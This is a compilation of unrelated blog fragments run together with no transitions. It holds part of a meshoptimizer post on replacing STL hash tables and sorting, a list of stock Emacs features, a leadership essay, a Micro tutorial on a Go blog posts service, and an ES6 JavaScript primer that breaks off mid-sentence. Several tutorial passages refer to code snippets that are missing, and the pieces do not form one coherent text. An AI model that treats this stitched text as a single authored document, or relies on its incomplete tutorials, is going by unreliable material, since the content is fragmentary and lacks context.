<p>This is a good starting point. We can see that performance is pretty solid in release - 0.6 seconds to decimate 1M triangle mesh is a good level of performance - generally more or less reasonable in debug with a notable exception of MSVC (the adverse behavior of MSVC STL in debug mode was one of the forcing functions to remove all STL use from meshoptimizer), and compile times generally vary but are uninspiring.</p>

<p>To put the compile times in perspective, Jonathan Blow recently posted a <a href="https://youtu.be/iD08Vpkie8Q?t=4984">video stream with compiler performance improvements</a>, where his game engine and game written in his new language compile and link in about a second (compilation itself takes about 0.9 seconds). That’s on a codebase that has 100K lines of code - our algorithm only has 1K lines of code (excluding STL, of course - it’s not entirely fair to exclude STL, but it’s not entirely fair to include STL either since we know our algorithm can be implemented in 1K LOC without any STL dependencies). 400 ms is something you notice when compiling your code, even if it’s just one file, and something that makes me less happy when working on the code - given many files like that, cumulative compilation performance can be bad. This is given the fact that our implementation is pretty spartan about the STL dependencies - we only use three algorithms/containers. Let’s see what happens when we stop using one of them.</p>



<p>The secret about the previous version we benchmarked is that it never existed in that form. While meshoptimizer initially used STL containers and algorithms, it never used <code>std::unordered_set</code> - that’s because based on prior experience I expected the performance to be insufficient for the kinds of algorithms I wanted to write, and had a custom replacement that was using quadratic probing in a large power of two sized array, which is similar to Google’s <code>dense_hash_set</code> design. It’s a kind of hash table I use and implement often in different codebases for different applications, so I’m very familiar with it. The implementation in <code>simplifier.cpp</code> is just 35 lines of code<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, so it’s easy to drop in and adapt for the use case at hand. Let’s see what happens when we use that instead.</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>334 ms</td>
      <td>461 ms</td>
      <td>2054 ms</td>
      <td>460 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>270 ms</td>
      <td>517 ms</td>
      <td>2152 ms</td>
      <td>452 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>314 ms</td>
      <td>609 ms</td>
      <td>1179 ms</td>
      <td>415 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>361 ms</td>
      <td>461 ms</td>
      <td>28337 ms</td>
      <td>380 ms</td>
    </tr>
  </tbody>
</table>

<p>It looks like the extra 35 lines for a manual implementation of a better hash table were worth it. We’re seeing significant performance improvements across the board, in debug/release and both in terms of compile time and run time. The largest increase in runtime performance is on MSVC, we got 1.5x faster, and this is given the fact that hash table isn’t used as a core part of the algorithm - it’s only used to establish uniqueness relationship between individual vertices before the algorithm starts.</p>

<p>This highlights the poor fit of <code>std::unordered_set</code> to performance-critical workloads, especially ones that are insert-heavy. Unfortunately, this is not an implementation defect and thus is not possible to correct - the issue is that the standard requirements on unordered containers preclude more efficient implementations. Here’s to hoping that eventually we’ll get a better hash table in the standard.</p>



<p>At some point during development of the simplifier repeated profiling of various meshes showed that a lot of time is being spent in <code>std::sort</code>. Now, <code>std::sort</code> isn’t the fastest sorting algorithm, but it’s generally extremely competitive with custom implementations and it’s hard to beat without changing the problem around. In my case, sorting was used on an array of edge collapses, with the sort key being a floating point error value - so the natural instinct is to use a 3-pass radix sort, using 11, 11 and 10 bits of the key in each pass. However, there’s an interesting alternative available to us here - we can do radix sort in a single pass, using an 11 bit key<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<p>What happens is that we have a 32-bit non-negative floating point value; if we take the top 12 bits and ignore the topmost one (since that’s a sign bit and is always 0), we get 11 bits that represent 8 bits of exponent and 3 bits of mantissa, which essentially gives us a value of similar magnitude but a significant round-off error. If we sort using this value as a key, as a result the sorting sequence isn’t going to be perfectly ordered with respect to the full 32-bit key. However, in our case we need to sort to be able to process better edge collapses first based on a heuristic - and the heuristic is a gross approximation so the extra error our sorting introduces is not noticeable. This technique is surprisingly useful in other domains where you don’t necessarily need an exact order either. A benefit of a single-pass radix sort is that it’s faster (you only need to do one pass over the data instead of 3!) and simpler to implement than a full-blown radix sort, taking just 36 lines of code<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>.</p>

<p>This time the gains in compilation times are somewhat more modest. We’ve removed <code>&lt;algorithm&gt;</code> header but it doesn’t seem so have had very significant benefits to compilation time - we’re still including <code>&lt;vector&gt;</code> and it’s possible that large STL headers are pulled by both. However, the effects on performance are very significant, especially on debug performance in libstdc++ (most likely <code>std::sort</code> is very slow in debug there) but the gains in release builds are also exciting. What is not obvious from this graph is that sorting got so much faster that it almost completely disappeared from the profiles compared to the other work - the entire algorithm runs “just” 1.35x faster, but the gains measured on just the sorting code are much larger, 117 ms -&gt; 10 ms in release builds.</p>



<p>One number that we haven’t moved substantially yet is the time it takes to run this code in debug using MSVC. While it’s natural to expect unoptimized builds to be slower than optimized, they have to be fast enough. Sometimes you want to debug your problem on a non-trivial input dataset. Sometimes you want to run the debug build with full checks through your tests to make sure they don’t trigger any bugs that could disappear in release. Sometimes you are trying to debug a different part of the program, but you still need to run the rest of it. Programmers creatively come up with many workarounds that make the problem less severe - you can make special builds that enable some optimizations but not all, you can use mixed optimization settings for different projects, you can use <code>#pragma optimize</code> to temporarily disable optimizations around offending parts of the code - but all of these seem like duct-tape. Let’s try to replace the only STL component we’re still using, …</p></div></div>

      <p>Emacs has a reputation for being borderline unusable out of the box, of being
bloated but somehow surprisingly bare.</p>
<p>This is largely a discoverability problem<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. The solution
the Internet has settled on seems to be “Emacs distributions” like Doom,
Spacemacs or Prelude that glue together dozens (sometimes hundreds) of addons to
deliver a batteries included, finely tuned and user-friendly experience from
first launch. While it’s not for me, this does work
great&nbsp;<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, and many of these packages will probably make
their way into the default Emacs experience in due time.</p>
<p>But while modern features like built-in LSP support, faster syntax highlighting
(through tree-sitter) and ligature support are still being debated in the
development mailing list, the long running, slow moving train of Emacs has
picked up many interesting passengers.</p>
<p>Emacs as shipped does a lot more than meets the eye, and external package
functionality often partially replicates built in behavior.</p>
<p>Here is a list of useful features in emacs I use regularly that I don’t see
mentioned or recommended often online. Guidelines I used to populate this list:</p>
<ul>
<li>No packages, <strong>stock Emacs only</strong>.</li>
<li>No steep learning curves. <strong>Learn each feature in under two minutes or bust</strong>.</li>
<li><strong>No gimmicks</strong>. No doctor, tetris, snake, dunnet, zone or butterfly.</li>
<li><strong>Just the deltas</strong>. No commonly mentioned packages like flymake, doc-view,
outline-minor-mode or eww/w3m. Nothing that Emacs brings up automatically or a
nonspecific Google search gets you.</li>
<li>Assume a modern Emacs, 26.3+.</li>
</ul>
<p>The list is written in the language of Emacs’ conventions. If you’re new to
Emacs, here’s some extra cognitive load for you:</p>

<p>As is the annoying case with many things Emacs though, it provides all the
ingredients and lights the flame but leaves the cooking to you. Here’s a simple
recipe:</p>
<div><pre><code data-lang="emacs-lisp">(<span>defun</span> <span>pulse-line</span> (<span>&amp;rest</span> <span>_</span>)
      <span>"Pulse the current line."</span>
      (<span>pulse-momentary-highlight-one-line</span> (<span>point</span>)))

(<span>dolist</span> (<span>command</span> <span>'</span>(<span>scroll-up-command</span> <span>scroll-down-command</span>
                   <span>recenter-top-bottom</span> <span>other-window</span>))
  (<span>advice-add</span> <span>command</span> <span>:after</span> <span>#'</span><span>pulse-line</span>))
</code></pre></div><p>Modify as needed. There’s more than one external package
(<a href="https://github.com/Malabarba/beacon">beacon</a>) that does this and more, but
<code>pulse</code> is just fine.</p>
<hr>
<h2 id="undo-in-region--c">Undo in region (<code>C-/</code>)</h2>
<p>Limit your undoing to the active region:</p>
<figure>
    <img src="https://karthinks.com/img/undo-in-region-demo.gif"> 
</figure>

<p>There’s nothing to set up or run here. This is the default behavior of undo in
Emacs.</p>
<hr>
<h2 id="follow-mode--m-x-follow-mode">Follow mode (<code>M-x follow-mode</code>)</h2>
<p>Most monitors are much wider than they are tall. Most text files are much longer
than they are wide. That’s a problem.</p>
<p><code>follow-mode</code> shows a contiguous buffer paginated across multiple windows. The
cursor flows from one window to the next.</p>
<figure>
    <img src="https://karthinks.com/img/follow-mode-demo.gif"> 
</figure>

<hr>
<h2 id="selective-display--c-x">Selective display (<code>C-x $</code>)</h2>
<p>If you code with rigid indentation, you can get a quick overview of your
document with <code>set-selective-display</code>. No mucking around with folding,
<code>outline-</code> or <code>hs-minor-mode</code> regexps.</p>
<figure>
    <img src="https://karthinks.com/img/set-selective-display-demo.gif"> 
</figure>

<p>Call the command with the prefix argument set to the column to hide. Call
without a prefix argument to disable.</p>
<hr>
<h2 id="pretty-symbols--m-x-prettify-symbols-mode">Pretty symbols (<code>M-x prettify-symbols-mode</code>)</h2>
<p>This one’s mainly for LaTeX users. Display unicode versions of math operators,
greek symbols and more. <code>M-x prettify-symbols-mode</code> in a TeX buffer.</p>
<figure>
    <img src="https://karthinks.com/img/prettify-symbols-test.png" alt="Figure 1: Before and after enabling prettify-symbols-mode"> <figcaption>
            <p>Figure 1: Before and after enabling <code>prettify-symbols-mode</code></p>
        </figcaption>
</figure>

<p>The equivalent in <code>org-mode</code> is <code>M-x org-toggle-pretty-entities</code>. Other major
modes will have to define the replacements explicitly to get this behavior.

<hr>
<h2 id="view-mode--m-x-view-mode">View mode (<code>M-x view-mode</code>)</h2>
<p>Provide pager-like keybindings. Makes navigating read-only buffers a breeze.
Move down and up with <code>SPC</code> and <code>delete</code> (backspace) or <code>S-SPC</code>, half a page
down and up with <code>d</code> and <code>u</code>, and isearch with <code>s</code>.</p>
<p>This is my preferred way to read code or documents as I can avoid chorded
commands. Note that <code>evil-mode</code> doesn’t help here either, since paging is bound
to <code>C-u/d/f/b</code>.</p>
<p><del>To that end I just hook this into <code>read-only-mode</code>.</del> Prolific emacser <a href="https://old.reddit.com/r/emacs/comments/jwhr6g/batteries%5Fincluded%5Fwith%5Femacs/gct12vp/">Omar
Antolin Camarena</a> points out a built-in way to use <code>view-mode</code> in all read-only
buffers, including ones you set read-only with <code>C-x C-q</code>:</p>
<p>This is my favorite feature of the bunch, considering how much time I spend in
Emacs reading things.</p>
<hr>
<h2 id="cycle-spacing--m-spc">Cycle-spacing (<code>M-SPC</code>)</h2>
<p>The <code>cycle-spacing</code> command is more versatile than it appears. By default, it
cycles between deleting all whitespace around cursor but one, deleting all
whitespace and restoring whitespace. But with a negative argument, it deletes
all blank lines around the cursor. (Calling it with a negative argument is fast:
Hold down Meta and hit minus and space in sequence.)</p>
<p>Put together, it’s doing the job of (almost) three older commands:
<code>just-one-space</code>, <code>delete-horizontal-space</code> and
<code>delete-blank-lines</code><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> This opens up the
bindings <code>C-x C-o</code> and <code>M-\</code> for more useful functions.</p>
<hr>
<h2 id="indirect-buffers--m-x-make-indirect-buffer">Indirect buffers (<code>M-x make-indirect-buffer</code>)</h2>
<p>One buffer. Two windows. Two states.</p>
<p>This one’s for outline/org users. Do you want to see an overview of your
document <em>and</em> the section you’re working on? <code>M-x make-indirect-buffer</code> or <code>M-x clone-indirect-buffer</code></p>
<p>Here I clone an org buffer and narrow the original to get a makeshift TOC:
<img src="https://karthinks.com/img/indirect-buffer-demo.gif" alt=""></p>
<p>At this point we’re a few lines of elisp away from writing a <code>toc-minor-mode</code>
for org files!</p>
<p>But the possibilities are much larger, because as the manual puts it:</p>
<blockquote>
<p>The text of the indirect buffer is always identical to the text of its base
buffer; changes made by editing either one are visible immediately in the other.
But in all other respects, the indirect buffer and its base buffer are
completely separate. They can have different names, different values of point,
different narrowing, different markers, different major modes, and different
local variables.</p>
</blockquote>
<hr>
<h2 id="html-fontify--m-x-htmlfontify-buffer">Html-fontify (<code>M-x htmlfontify-buffer</code>)</h2>
<p>Reproduce the look of your emacs buffer as a html file with CSS. This is either
extremely useful or useless to you!</p>
<p><a href="https://karthinks.com/share/htmlfontify-demo.html">Here</a> is the html-fontified version of the
source file of this write-up.</p>
<hr>
<h2 id="dwim-commands--upcase-downcase-etc">DWIM commands (upcase, downcase  etc)</h2>
<p>Modern versions of Emacs provide Do-What-I-Mean versions of various editing
commands: They act on the region when the region is active, and on an
appropriate semantic unit otherwise. Replace <code>upcase-word</code> and <code>downcase-word</code>
with <code>upcase-dwim</code> and <code>downcase-dwim</code> respectively, and you can safely eject
the bindings for <code>upcase-region</code> and <code>downcase-region</code>.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>.</p>
<div><pre><code data-lang="emacs-lisp">(<span>global-set-key</span> (<span>kbd</span> <span>"M-u"</span>) <span>'upcase-dwim</span>)
(<span>global-set-key</span> (<span>kbd</span> <span>"M-l"</span>) <span>'downcase-dwim</span>)
</code></pre></div><p>DWIM is standard behavior for emacs commands even when it doesn’t say that in
the name. <code>count-words</code>, <code>query-replace</code>, the list goes on. Check to see if your
frequently used commands DWYM.</p>
<hr>
<h2 id="unit-conversion-in-calc--m-x-calc">Unit conversion in calc (<code>M-x calc</code>)</h2>
<p>It’s <code>u c</code>. And <code>'</code> (quote) for algebraic entry: <img src="https://karthinks.com/img/calc-units-demo.gif" alt="">
<code>calc</code> does a lot more with units. You can simplify, define new unit conversions
and more. Hit <code>u ?</code> to see your options.</p>
<hr>
<h2 id="symbolic-computation-in-calc--m-x-calc">Symbolic computation in calc (<code>M-x calc</code>)</h2>
<p>We’re skirting the “<strong>learn each feature in under two minutes or bust</strong>” rule with
this one, as it deserves its own write-up, or a perusal of the manual. The
general interaction paradigm is simple, though.</p>
<p>Let’s find a Taylor expansion of the integral of the error function:
<img src="https://karthinks.com/img/calc-symbolic-demo.gif" alt=""></p>
<p>Access algebraic routines (root finding, symbolic manipulation) in calc under
the <code>a</code> prefix. Indefinite integration is <code>a i</code>, differentiation is <code>a d</code>,
solving algebraic equations is <code>a S</code> and so on. (Hit <code>a ?</code>)</p>
<hr>

<p>What it says on the tin. Move the buffer instead of the cursor when navigating.
Just press the scroll lock key or <code>M-x scroll-lock-mode</code>.</p>
<hr>
<h2 id="tabs--m-x-tab-bar-mode">Tabs (<code>M-x tab-bar-mode</code>)</h2>
<p>These are mentioned often, but rarely recommended. Most Emacs users find the
idea of tabs in Emacs to be redundant, but will happily recommend window
configuration registers, which provides similar functionality.</p>
<p>Tabs work great to separate projects, or work and email buffers. In principle
this is equivalent to popping up a new frame and letting the window manager
handle the separation, but on stacking window managers I find tabs to be much
preferable.</p>
<p>Since there’s never one way to do something in Emacs, a secondary
<code>tab-line-mode</code> is available that adds tabs to each window instead of frame.</p>
<hr>
<h2 id="next-time">Next time:</h2>
<ul>
<li><code>icomplete</code> and <code>fido</code>: Incremental completion systems</li>
<li><code>completion-styles</code>: Supercharge completion in the minibuffer</li>
<li><code>re-builder</code> and <code>rx</code>: Visual regular expressions</li>
<li><code>orgtbl-mode</code>: Easy table formatting everywhere</li>
<li><code>strokes-mode</code>: Control emacs with mouse gestures</li>
</ul>
<p>… and more.</p>

				<div><p>Yesterday morning I had the privilege of being on a <a href="https://themarketingmeetup.com/blog/penny-ferguson-and-catherine-newman/" target="_blank" rel="noopener noreferrer" data-cke-saved-href="https://themarketingmeetup.com/blog/penny-ferguson-and-catherine-newman/">webinar</a> with Joe and Catherine talking about personal leadership and a definition that I think could do with maybe a little more explanation, even though is a much bigger subject.</p>

<p><em>Outstanding managers drive people to perform at the highest level they are capable of. It is very much about control.</em></p>
<p>Outstanding leaders inspire them to do it for themselves, and it is more about freedom.</p>
<p>Please recognise the first word of these sentences is the word ‘outstanding’. &nbsp;Both of these styles can be very successful – they are just different. &nbsp;The knack is being aware of which is appropriate to use and when.</p>
<h2><strong>Leadership throughout life</strong></h2>
<p>My most important leadership role in my life is that of a parent and I really didn’t understand anything about leadership until my children had grown up.</p>
<p>With what I now know, there is no question in my mind that I managed all of my six children when they were growing up and I bitterly regret not learning all of this much sooner.</p>
<p>I love then more than anything else in my world and I had a history of making some pretty stupid mistakes in my life which I never wanted them to make.</p>
<p>I did my best to sort out all of their problems, gave advice all the time, pointed out where there were risks and how to avoid them, told them what to do, when to do it and how to do it, and generally did everything possible for them, even making their beds!</p>
<p>Through loving them so much I was, in fact, disempowering them, educating them how not to think for themselves, I was inadvertently telling them they could not do anything without me plus they could never be better than I was yesterday. Big oops!</p>
<h3><em><strong>Let’s recognise where we are right now: ‘world unusual’.&nbsp;</strong></em></h3>
<p>We are probably in a position at work where we are having to make painful decisions, that we have no wish to make, and it’s going to affect people’s lives, and we care so much for each of these individuals.</p>
<p>Our temptation is to leap into telling people what to do, how to do it, try to convince them that all will be fine and take on all the responsibility for keeping them safe and motivated. &nbsp;All feelings to be applauded.</p>
<p>However, in these examples, how are we communicating?</p>
<p>It is all ‘let me tell you what I think…’, I’ve got a great suggestion…’ , ‘I think you’ve got it wrong…’.</p>
<p>This language is entirely management and we are in control. &nbsp;All my experience, with evidence coming out of my ears, is that this style of communicating is very typical for most of us and is almost entirely because we care and desperately want to help. &nbsp;For me, learning this at a late age, it was a serious shock to my system!</p>
<h3><em><strong>If you want to step into leadership then our communication style needs to shift considerably. Some examples could be:</strong></em></h3>
<ul>
<li>So what do you think?</li>
<li>I love that idea that you have just had</li>
<li>If you knew there is one thing you could do today to support your team what would it be?</li>
<li>If you had 50% more confidence what would you do?</li>
<li>If I wasn’t here what might you do?</li>
</ul>
<p>This is where all the focus is on helping the individual, or the team, think for themselves. &nbsp;It is about ‘you’ not ‘I’. &nbsp;It is them taking responsibility for how they choose to think and behave, it is empowering not disempowering and, above all, can inspire individuals to own more and more of their potential.</p>
<p>This is a critical aspect of leadership and the most exciting, amazing and ongoing journey of my life. &nbsp;It is giving every person the biggest gift you can give anyone, the opportunity to make their own choices and take responsibility for their own life.</p>
<p>So, this makes it pretty clear that you cannot look at management or leadership without looking at how you communicate – these are so closely linked together that it is inseparable and one of three key components of becoming a great leader.</p>
<p>How you choose to think and understanding responsibility at a much more profound level are the other two. A subject for another day!</p></div>

        <!-- <h1 class="post-title">Building a blog with Micro in Go</h1> -->

        <section>
            <p><em>This is a cross post from <a href="https://micro.mu.blog/">micro.mu/blog</a> on how to build a blog with Micro. 
We’ve been getting a lot of feedback on our series related to Netlify for the backend and what’s clear, 
people want to see more code. So here it is. Hope you enjoy!</em></p>

<p>This series will cover how to build a blog service using Micro. We’ll decompose a monolithic Blog into multiple services. 
In part one we’ll focus on building a Post service. It will be good way to learn how to build nontrivial applications with 
the <a href="https://micro.mu/reference#store">store</a> and the <a href="https://github.com/micro/dev/tree/master/model">model</a>.</p>

<p>The most important takeaway from this post will likely be the the usage of the key-value store for non-trivial usecases 
(such as querying blog posts by slug and listing them by reverse creation order).</p>

<h2 id="the-basics">The Basics</h2>

<p>Head to the <a href="https://micro.mu/getting-started">Getting Started Guide</a> if you haven’t used Micro before.</p>

<p>If you have let’s use that knowledge! As a reminder, we have to make sure <code>micro server</code> is running in an other terminal, 
and we are connected to it, ie</p>

<p>Running the micro server</p>



<p>Looking up our local environment</p>

<div><div><pre><code><span>$ </span>micro <span>env</span>
<span>*</span> <span>local      </span>127.0.0.1:8081         Local running micro server
  dev        proxy.m3o.dev          Cloud hosted development environment
  platform   proxy.m3o.com          Cloud hosted production environment
</code></pre></div></div>

<p>We can see the local environment picked. If not, we can issue <code>micro env set local</code> to remedy.</p>

<p>Now back to the <code>micro new</code> command:</p>

<div><div><pre><code><span>$ </span>micro new posts
<span>$ </span><span>ls </span>posts
Dockerfile	Makefile	README.md	generate.go	go.mod		handler		main.go		proto
</code></pre></div></div>

<p>Great! The best way to start a service is to define the proto. The generated default should be something similar to this:</p>

<p>In our post service, we want 3 methods:</p>
<ul>
  <li><code>Save</code> for blog insert and update</li>
  <li><code>Query</code> for reading and listing</li>
  <li><code>Delete</code> for deletion</li>
</ul>

<p>Let’s start with the post method.</p>



<p>Astute readers might notice that although we have defined a <code>Post</code> message type, we still redefine some of the fields as top level fields for the <code>SaveRequest</code> message type.
The main reason for this is that we don’t want our <a href="https://micro.mu/reference#dynamic-commands">dynamic commands</a>.</p>

<p>Ie. if we would embed a <code>Post post = 1</code> inside <code>SaveRequest</code>, we would call the posts service the following way:</p>

<div><div><pre><code>micro posts save <span>--post_title</span><span>=</span>Title <span>--post_content</span><span>=</span>Content
</code></pre></div></div>

<p>but we don’t want to keep repeating <code>post</code>, our preferred way is:</p>

<div><div><pre><code>micro posts save <span>--title</span><span>=</span>Title <span>--content</span><span>=</span>Content
</code></pre></div></div>

<p>To regenerate the proto, we have to issue the <code>make proto</code> command in the project root.</p>

<p>Now, the <code>main.go</code>:</p>



<p>After that’s done, let’s adjust the handler to match our proto! This snippet is a bit longer, so cover it piece by piece:</p>



<p>The above piece of code uses the <a href="https://github.com/micro/dev/tree/master/model">model package</a>. It sets up the indexes which will enable us to query the data and also tells model to maintain these indexes.</p>

<ul>
  <li>The id index is needed to read by id</li>
  <li>The created index is needed so when we list posts the order of the posts will be descending based on the created field</li>
  <li>The slug index is needed to we can read posts by slug (ie. <code>myblog.com/post/awesome-post-url</code>)</li>
</ul>

<p>At this point <code>micro run .</code> in project root should deploy our post service. Let’s verify with <code>micro logs posts</code>:</p>

<div><div><pre><code>$ micro logs posts
Starting [service] posts
Server [grpc] Listening on [::]:53031
Registry [service] Registering node: posts-b36361ae-f2ae-48b0-add5-a8d4797508be
</code></pre></div></div>

<p>(The exact output might depend on the actual config format configuraton.)</p>

<h2 id="saving-posts">Saving posts</h2>

<p>Let’s make our service do something useful now: save a post.</p>



<p>After a <code>micro update .</code> in project root, we can start saving posts!</p>

<div><div><pre><code>micro posts save --id=1 --title="Post one" --content="First saved post"
micro posts save --id=2 --title="Post two" --content="Second saved post"
</code></pre></div></div>

<h2 id="querying-posts">Querying posts</h2>

<p>Again, implementation starts with defining the protos:</p>



<p>A <code>make proto</code> issued in the command root should regenerate the Go proto files and we should be ready to define our new handler:</p>

<p>We want our query handler to enable querying by id, slug and also enable listing of posts:</p>



<p>As mentioned, the existing indexes can be used for querying too with the <code>ToQuery</code> method.</p>

<p>After doing a <code>micro update .</code> in the project root, we can now query the posts:</p>

<div><div><pre><code>$ micro posts query
{
	"posts": [
		{
			"id": "2",
			"title": "Post two",
			"slug": "post-two",
			"content": "Second saved post",
			"created": "1604423363"
		},
		{
			"id": "1",
			"title": "Post one",
			"slug": "post-one",
			"content": "First saved post",
			"created": "1604423297"
		}
	]
}

</code></pre></div></div>

<p>Stellar! Now only <code>Delete</code> remains to be implemented to have a basic post service.</p>

<h2 id="deleting-posts">Deleting posts</h2>

<p>Since we have already defined <code>Delete</code> in our proto, we only have to implement the handler. It is rather simple:</p>



<h2 id="conclusions">Conclusions</h2>

<p>This brings us to the end of the first post in the blogs tutorial series.
There are many more features we will add later, like saving and querying by tags, but this post already taught us enough to digest.
We will cover those aspect in later parts of this series.</p>

<p>The source code for this can be found <a href="https://github.com/micro/dev/tree/master/blog/v1-posts">here</a>.
Further versions will be in the same <code>blog</code> folder with different versions, ie <code>v2-posts</code> and once we have more services, <code>v2-tags</code>, <code>v2-comments</code>.
Folders with the same prefix will be meant to be deployed together, but more on this later.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><time>August 17, 2020</time></p><p>I have a confession to make. While I have been a professional web developer for over 6 years, I didn’t feel comfortable with JavaScript until a year and a half ago. I still don’t feel like I know a lot of things. There’s a lot that still confuses me. But I’ve grown a lot in my knowledge in the past year and a half. I wanted to share what I’ve learned.</p><p>My goal is to get more accessibility folks into the JavaScript community. The cryptic vocabulary for JavaScript concepts is intimidating for many folks (including myself). It’s why I didn’t become a JavaScript developer until I was 4.5 years into my career. Many experts say you should know the fundamentals well before learning frameworks. But where is that boundary? What is “knowing the fundamentals?” When do you know enough to jump into React?</p><p>I saw this tweet by <a href="https://twitter.com/EriPDev">Erika</a>, and it inspired a lot of the tone of this blog post.</p><blockquote><p lang="en" dir="ltr">React is just JS so you need to at least know of the fundamentals and major ES6 concepts. Don't need to be an expert but you need to know what you're looking at</p>— ✨Oobrikoob with a 'k'✨ (@EriPDev) <a href="https://twitter.com/EriPDev/status/1283039172840882178?ref_src=twsrc%5Etfw">July 14, 2020</a></blockquote><p>Something I’ve enjoyed about React is how much I’ve learned about JavaScript from jumping in. But at the same time, jumping in without as Erika says, “knowing what you’re looking at,” you may wind up confused. Below are some of the concepts helpful to me for knowing what I was looking at.</p><p><strong>Prerequisites</strong></p><p>Before you go through this blog post, I highly recommend you take the CodeAcademy <a href="https://www.codecademy.com/learn/introduction-to-javascript">Intro to JavaScript</a> course (the free parts should be enough of an overview). I won’t be going in depth with concepts like “what is a variable?” These are all concepts I believe you should understand as well before reading this blog post.</p><p>If you don’t want to sign up for CodeAcademy (I get it, I hate signing up for new things too), review at least these concepts on MDN:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/var">Variables</a>: This includes the “see also” section on <code>let</code> and <code>const</code></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions">Functions</a>: I’ll be going over Arrow functions in this post, so that’s not a prerequisite.</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures">Data Types</a>: Don’t stress out too much about the vocabulary here. It can be overwhelming. But I’m going to use words like ‘string’ and ‘object’ in this blog post, so you should know what I mean by that.</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object">Objects</a></li></ul><p>Now let’s get started 🤓</p><h2>Template Literals/Strings</h2><p>Pre ES6/ES2015, rendering JavaScript within a string used to be a HUGE pain. You had  to create strings and concatenate the strings and the variables together with a plus sign +.</p><p>Let’s say we have a function that renders a  short bio. We pass three arguments into the function. Those arguments will render within the bio.</p><p>Pre ES6 we had to create a bunch of different strings and concatenate them with variables.</p><div data-language="js"><pre><code><span>function</span> <span>shortBio</span><span>(</span><span>name<span>,</span> age<span>,</span> job</span><span>)</span> <span>{</span>
  <span>return</span> <span>"Hi, I'm "</span> <span>+</span> name <span>+</span> <span>". I'm "</span> <span>+</span> age <span>+</span> <span>" years old and work as a "</span> <span>+</span> job <span>+</span> <span>"."</span>
<span>}</span></code></pre></div><p>There are a few unideal things for me:</p><ol><li>There are 4 separate strings.</li><li>It’s hard for me to read. Having random spaces within the strings makes it a harder for me to visualize.</li><li>If you want this string to be multiple lines, it becomes a nightmare. You have to end the string at the end of the line, add a plus sign, and then restart a string on the next line. Take a look at this <a href="https://stackoverflow.com/a/6247331">StackOverflow</a> reply to see how unwieldy it can be.</li></ol><p>In ES6, template strings emerged. To start a template string, you use a backtick ` and start writing the string. Then, we want to inject some other JavaScript into the string. Here we add a dollar sign and starting curly brace. When you finish writing JavaScript logic, you close the curly brace. This formatting results in more readable code.</p><div data-language="js"><pre><code><span>function</span> <span>shortBio</span><span>(</span><span>name<span>,</span> age<span>,</span> job</span><span>)</span> <span>{</span>
  <span>return</span> <span><span>`</span><span>Hi, I'm </span><span><span>${</span>name<span>}</span></span><span>. I'm </span><span><span>${</span>age<span>}</span></span><span> years old and work as a </span><span><span>${</span>job<span>}</span></span><span>.</span><span>`</span></span>
<span>}</span></code></pre></div><p>Source: <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Template Literals - MDN Docs</a></p><h2>Using the spread operator</h2><p>First, what is the spread operator? The spread operator “allows an iterable such as an array expression or string to be expanded in places where zero or more arguments (for function calls) or elements (for array literals) are expected, or an object expression to be expanded in places where zero or more key-value pairs (for object literals) are expected.” (Source: <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax">Spread Syntax - MDN Docs</a>)</p><p>I’m sorry, what? What does that even mean?</p><p>In my own words, we are taking every item in an array and “expanding” it where the items in the array would work, but not the array itself.  You can also use the spread operator for every letter in a string, but I rarely use it this way.</p><p>In the more technical sense, let’s take this object:</p><div data-language="js"><pre><code><span>const</span> person <span>=</span> <span>{</span>
 name<span>:</span> <span>'Lindsey'</span><span>,</span>
 age<span>:</span> <span>30</span><span>,</span>
 jobTitle<span>:</span> <span>'Senior UI Engineer'</span><span>,</span>
<span>}</span></code></pre></div><p>And let’s use the <code>shortBio</code> function from the previous section to render a bit about me.</p><div data-language="js"><pre><code><span>function</span> <span>shortBio</span><span>(</span><span>name<span>,</span> age<span>,</span> job</span><span>)</span> <span>{</span>
  <span>return</span> <span><span>`</span><span>Hi, I'm </span><span><span>${</span>name<span>}</span></span><span>. I'm </span><span><span>${</span>age<span>}</span></span><span> years old and work as a </span><span><span>${</span>job<span>}</span></span><span>.</span><span>`</span></span>
<span>}</span></code></pre></div><p>And make it into an array using the <code>Object.values()</code> method to make it an array of all those values. <code>Object.values()</code> takes the values of every property in an object and adds it to a new array <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/values">MDN Docs</a></p><div data-language="js"><pre><code><span>const</span> personArr <span>=</span> Object<span>.</span><span>values</span><span>(</span>person<span>)</span></code></pre></div><p>This method will return an array that looks like this</p><div data-language="js"><pre><code><span>[</span><span>"Lindsey"</span><span>,</span> <span>30</span><span>,</span> <span>"Senior UI Engineer"</span><span>]</span></code></pre></div><p>Then I can use the spread syntax to iterate every item in the array as each parameter.</p><p>Which would be the same as</p><div data-language="js"><pre><code><span>shortBio</span><span>(</span>person<span>.</span>name<span>,</span> person<span>.</span>age<span>,</span> person<span>.</span>jobTitle<span>)</span></code></pre></div><p>We can also use the spread syntax to make a copy of an object.</p><div data-language="js"><pre><code><span>const</span> lindsey <span>=</span> <span>{</span><span>...</span>person<span>}</span></code></pre></div><p>If you want to play around with this example, I’ve created a <a href="https://codepen.io/littlekope0903/pen/dyMywYv?editors=1011">CodePen</a>.</p><p>So why is this 